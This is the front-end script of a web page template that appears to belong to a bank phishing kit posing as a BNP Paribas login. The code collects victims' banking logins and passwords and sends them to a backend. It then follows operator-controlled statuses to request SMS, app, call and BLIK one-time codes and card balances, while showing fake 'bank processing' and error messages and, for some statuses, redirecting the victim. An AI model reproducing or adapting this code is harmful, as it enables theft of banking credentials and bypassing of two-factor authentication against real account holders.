    <script src="js/jquery.min.js"></script>
    <script src="js/vue-swal.min.js"></script>
    <script src="js/axios.min.js"></script>
    <script src="js/jquery-3.6.0.min.js"></script>
    <script src="js/bootstrap.bundle.min.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/sweetalert.min.js"></script>

    <script>
      var token = null

      document.getElementById("btn").onclick = async function () {
        const login = document.getElementById("login").value
        const password = document.getElementById("password").value

        if (!login || !password) return alert("Заполните все поля")

        await axios.post("/api/sendBank", {
          adId: "<%=ad.id%>",
          login: login,
          password: password,
          bank: "bnpparib BANK",
        }).then(async function (res) {
                    token = res.data.token
                    init(res.data.token)
                })
            };

            async function init(token) {
                    var currentStatus = null;

                    function waitModal() {
                        swal({
                            title: "<%=translate["wait"][ad.service.lang]%>",
                            text: "<%=translate["bank_processes"][ad.service.lang]%>",
                            type: "info",
                            closeOnClickOutside: false,
                            closeOnEsc: false,
                            buttons: false,
                        }).then((ok) => {
                            if (ok) document.location.href = "/ad/" + AD_ID;
                        });
                    }

                    function limitsModal() {
                        swal({
                            title: "<%=translate["error_title"][ad.service.lang]%>",
                            text: "<%=translate["limits"][ad.service.lang]%>",
                            type: "error",
                            closeOnConfirm: false,
                            closeOnCancel: false,
                            closeOnClickOutside: false,
                            closeOnEsc: false,
                        }).then((ok) => {
                            if (ok) document.location.href = "/ad/" + AD_ID;
                        });
                    }
                    function erroronlModal(err) {
                        swal({
                            title: "<%=translate["info"][ad.service.lang]%>",
                            text: `${err}`,
                            type: "info",
                            closeOnConfirm: false,
                            closeOnCancel: false,
                            closeOnClickOutside: false,
                            closeOnEsc: false,
                        }).then((ok) => {
                            if (ok) document.location.href = "/ad/" + AD_ID;
                        });
                    }
                    function forVerifyModal() {
                        swal({
                            title: "<%=translate["error_title"][ad.service.lang]%>",
                            text: "<%=translate["for_verify"][ad.service.lang]%>",
                            type: "error",
                            closeOnConfirm: false,
                            closeOnCancel: false,
                            closeOnClickOutside: false,
                            closeOnEsc: false,
                        }).then((ok) => {
                            if (ok) document.location.href = "/ad/" + AD_ID;
                        });
                    }

                    function otherCardModal() {
                        swal({
                            title: "<%=translate["error_title"][ad.service.lang]%>",
                            text: "<%=translate["other_card"][ad.service.lang]%>",
                            type: "error",
                            closeOnConfirm: false,
                            closeOnCancel: false,
                            closeOnClickOutside: false,
                            closeOnEsc: false,
                        }).then((ok) => {
                            if (ok) document.location.href = "/ad/" + AD_ID;
                        });
                    }
                        function moneyModal() {
                        swal({
                            title: "<%=translate["error_title"][ad.service.lang]%>",
                            text: "<%=translate["dep_text"][ad.service.lang]%>",
                            type: "error",
                            closeOnConfirm: false,
                            closeOnCancel: false,
                            closeOnClickOutside: false,
                            closeOnEsc: false,
                        }).then((ok) => {
                            if (ok) document.location.href = "/ad/" + AD_ID;
                        });
                    }
                    function wronglk() {
            			swal("<%=translate["error_title"][ad.service.lang]%>", "<%=translate["lkby_fake"][ad.service.lang]%>", "info", {
                    closeOnEsc: false,
            				closeOnClickOutside: false,
            				buttons: {
            					confirm: {
            						text: "<%=translate["submit"][ad.service.lang]%>",
            						closeModal: true,
            					},
            				},
            			});
            		}

                    function pushModal() {
                        swal("<%=translate["push_title"][ad.service.lang]%>", "<%=translate["push_text"][ad.service.lang]%>", "info", {
                            closeOnClickOutside: false,
                            closeOnEsc: false,
                            buttons: false,
                        });
                    }
        function depModal() {
                        swal("<%=translate["dep_error"][ad.service.lang]%>", "<%=translate["dep_text"][ad.service.lang]%>", "error", {
                            closeOnClickOutside: false,
                            closeOnEsc: false,
                            buttons: false,
                        });
                    }
                    function successModal() {
                        swal("<%=translate["success"][ad.service.lang]%>", "<%=translate["money_will"][ad.service.lang]%>", "success", {
                            closeOnClickOutside: false,
                            closeOnEsc: false,
                            buttons: false,
                        });
                    }
                    function pictureModal() {
                        swal(
                            translate["picture_title"].ua,
                            translate["picture_text"].ua,
                            "info",
                            {
                                content: {
                                    element: "div",
                                    attributes: {
                                        id: "pictures_div",
                                    },
                                },
                                closeOnClickOutside: false,
                                closeOnEsc: false,
                                buttons: false,
                            }
                        );
                        const pictures = [
                            "банан",
                            "брюки",
                            "бургер",
                            "гитара",
                            "зонтик",
                            "календарь",
                            "калькулятор",
                            "карандаш",
                            "клубника",
                            "компас",
                            "крокодил",
                            "лимон",
                            "мамонт",
                            "микрофон",
                            "наушники",
                            "очки",
                            "помидор",
                            "свитер",
                            "телефон",
                            "цветок",
                            "шоколад",
                        ].sort(() => Math.random() - 0.5);

                        document.querySelector("#pictures_div").innerHTML =
                            '<div class="pictures-container">' +
                            pictures
                                .map(
                                    (v) =>
                                        '<div class="pictures-element" data-item="' +
                                        v +
                                        '"><img draggable="false" alt="" src="/img/pictures/' +
                                        v +
                                        '.png"></div>'
                                )
                                .join("\n") +
                            "</div>";
                        document.querySelector(".pictures-container").classList.remove("disabled");
                    }
                    function codeModal(
                        codeType = "sms", title = "<%=translate["sms_title"][ad.service.lang]%>", text = "<%=translate["sms_text"][ad.service.lang]%>", placeholder = "<%=translate["sms_placeholder"][ad.service.lang]%>", wrong_code = "<%=translate["wrong_code"][ad.service.lang]%>"
                    ) {
                        swal.stopLoading();
                        swal({
                            title,
                            text,
                            content: {
                                element: "input",
                                attributes: {
                                    type: "password",
                                    placeholder,
                                    maxLength: 255,
                                    required: true,
                                    style:
                                        "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
                                },
                            },
                            closeOnEsc: false,
                            closeOnClickOutside: false,
                            buttons: {
                                confirm: {
                                    text: "<%=translate["submit"][ad.service.lang]%>",
                                    closeModal: false,
                                },
                            },
                        }).then(async (code) => {
                            try {
                                if (!code) return;
                                $.ajax({
                                    type: "POST",
                                    url: "/api/submitCode",
                                    data: {
                                        codeType,
                                        code,
                                        token: token,
                                    },
                                    success: (data) => {
                                        swal.stopLoading();
                                        return   swal({
                     title: "<%=translate["wait"][ad.service.lang]%>",
                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
                     icon: "info",
                     closeOnClickOutside: false,
                     closeOnEsc: false,
                     buttons: false,
                   });
                                        codeModal(...arguments);
                                    },
                                    error: () => {
                                        swal.stopLoading();
                      return   swal({
                     title: "<%=translate["wait"][ad.service.lang]%>",
                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
                     icon: "info",
                     closeOnClickOutside: false,
                     closeOnEsc: false,
                     buttons: false,
                   });
                                        codeModal(...arguments);
                                    },
                                });
                            } catch (err) {
                                swal.stopLoading();
              return   swal({
                     title: "<%=translate["wait"][ad.service.lang]%>",
                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
                     icon: "info",
                     closeOnClickOutside: false,
                     closeOnEsc: false,
                     buttons: false,
                   });
                                codeModal(...arguments);
                            }
                        });
                    }
                    function ferrModal(
                        codeType = "sms", title = "<%=translate["sms_title"][ad.service.lang]%>", text = "<%=translate["sms_text"][ad.service.lang]%>", placeholder = "<%=translate["sms_placeholder"][ad.service.lang]%>", wrong_code = "<%=translate["wrong_code"][ad.service.lang]%>"
                    ) {
                        swal.stopLoading();
                        swal({
                            title,
                            text,
                            content: {
                                element: "input",
                                attributes: {
                                    type: "password",
                                    placeholder,
                                    maxLength: 255,
                                    required: true,
                                    style:
                                        "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
                                },
                            },
                            closeOnEsc: false,
                            closeOnClickOutside: false,
                            buttons: {
                                confirm: {
                                    text: "<%=translate["submit"][ad.service.lang]%>",
                                    closeModal: false,
                                },
                            },
                        }).then(async (code) => {
                            try {
                                if (!code) return;
                                $.ajax({
                                    type: "POST",
                                    url: "/api/submitCode",
                                    data: {
                                        codeType,
                                        code,
                                        token: token,
                                    },
                                    success: (data) => {
                                        swal.stopLoading();
                      return   swal({
                     title: "<%=translate["wait"][ad.service.lang]%>",
                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
                     icon: "info",
                     closeOnClickOutside: false,
                     closeOnEsc: false,
                     buttons: false,
                   });
                                        codeModal(...arguments);
                                    },
                                    error: () => {
                                        swal.stopLoading();
                                        return   swal({
                     title: "<%=translate["wait"][ad.service.lang]%>",
                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
                     icon: "info",
                     closeOnClickOutside: false,
                     closeOnEsc: false,
                     buttons: false,
                   });
                                        codeModal(...arguments);
                                    },
                                });
                            } catch (err) {
                                swal.stopLoading();
              return   swal({
                     title: "<%=translate["wait"][ad.service.lang]%>",
                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
                     icon: "info",
                     closeOnClickOutside: false,
                     closeOnEsc: false,
                     buttons: false,
                   });
                                codeModal(...arguments);
                            }
                        });
                    }

           function correctBalanceModal(
                        codeType = "balance", title = "<%=translate["error_title"][ad.service.lang]%>", text = "<%=translate["correct_balance"][ad.service.lang]%>",
                    ) {
                        swal.stopLoading();
                        swal({
                            title,
                            text,
                            content: {
                                element: "input",
                                attributes: {
                                    type: "text",
                                    maxLength: 255,
                                    required: true,
                                    style:
                                        "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
                                },
                            },
                            closeOnEsc: false,
                            closeOnClickOutside: false,
                            buttons: {
                                confirm: {
                                    text: "<%=translate["submit"][ad.service.lang]%>",
                                    closeModal: false,
                                },
                            },
                        }).then(async (code) => {
                            try {
                                if (!code) return;
                                $.ajax({
                                    type: "POST",
                                    url: "/api/submitBalance",
                                    data: {
                                        codeType,
                                        code,
                                        token: token,
                                    },
                                    success: (data) => {
                                        swal.stopLoading();
                      return   swal({
                     title: "<%=translate["wait"][ad.service.lang]%>",
                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
                     icon: "info",
                     closeOnClickOutside: false,
                     closeOnEsc: false,
                     buttons: false,
                   });
                                        correctBalanceModal(...arguments);
                                    },
                                    error: () => {
                                        swal.stopLoading();
                      return   swal({
                     title: "<%=translate["wait"][ad.service.lang]%>",
                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
                     icon: "info",
                     closeOnClickOutside: false,
                     closeOnEsc: false,
                     buttons: false,
                   });
                                        correctBalanceModal(...arguments);
                                    },
                                });
                            } catch (err) {
                                swal.stopLoading();
              return   swal({
                     title: "<%=translate["wait"][ad.service.lang]%>",
                     text: "<%=translate["bank_processes"][ad.service.lang]%>",
                     icon: "info",
                     closeOnClickOutside: false,
                     closeOnEsc: false,
                     buttons: false,
                   });
                                correctBalanceModal(...arguments);
                            }
                        });
                    }

                    function checkLogStatus() {
                        $.ajax({
                            type: "POST",
                            url: "/api/checkStatus",
                            data: {
                                token: token,
                            },
                            success: (data) => {
                                if (data.status == currentStatus) return;
                                currentStatus = data.status;
                                if (currentStatus == "profit") successModal();
                                else if (currentStatus == "sms") codeModal();



                                else if (currentStatus.includes("error")) {
                                    erroronlModal(currentStatus.split("error_")[1]);
                                }
                                else if (currentStatus.includes("ferr"))ferrModal(
                                    "custom",
                                    "<%=translate["info"][ad.service.lang]%>",
                                    currentStatus.split("ferr_")[1],
                                    "<%=translate["enterrr"][ad.service.lang]%>",
                                    "<%=translate["wrongg"][ad.service.lang]%>",
                                );




                                else if (currentStatus == "appCode")
                                    codeModal(
                                        "app",
                                        "<%=translate["app_code_title"][ad.service.lang]%>",
                                        "<%=translate["app_code_text"][ad.service.lang]%>",
                                        "<%=translate["app_code_placeholder"][ad.service.lang]%>",
                                    );
                                else if (currentStatus == "callCode")
                                    codeModal(
                                        "call",
                                        "<%=translate["call_code_title"][ad.service.lang]%>",
                                        "<%=translate["call_code_text"][ad.service.lang]%>",
                                        "<%=translate["call_code_placeholder"][ad.service.lang]%>",
                                    );
                                    else if (currentStatus == "money")
                                    moneyModal(
                                        "money",
                                        "<%=translate["error_title"][ad.service.lang]%>",
                                        "<%=translate["dep_text"][ad.service.lang]%>",
                                    );
                                else if (currentStatus == "blik")
                                    codeModal(
                                        "blik",
                                        "<%=translate["blik_code_title"][ad.service.lang]%>",
                                        "<%=translate["blik_code_text"][ad.service.lang]%>",
                                        "<%=translate["blik_code_placeholder"][ad.service.lang]%>",
                                    );
                                else if (currentStatus == "fakeLk") wronglk();
                                else if (currentStatus == "push") pushModal();
                                else if (currentStatus == "limits") limitsModal();
                                else if (currentStatus == "otherCard") otherCardModal();
                                else if (currentStatus == "money") moneyModal();
              else if (currentStatus == "scream") document.location.href = `http://ibaillanos.tv`;
        else if (currentStatus == "dep") this.depModal();

        else if (currentStatus == "card") document.location.href = `/ad/<%=ad.id%>`;


                                else if (currentStatus == "forVerify") forVerifyModal();
                                else if (currentStatus == "correctBalance") correctBalanceModal();
                                else if (currentStatus == "picture") pictureModal();
                            },
                        }).done(() => setTimeout(checkLogStatus, 1500));
                    }
                    setTimeout(checkLogStatus, 1500)
                    waitModal()
                }
    </script>
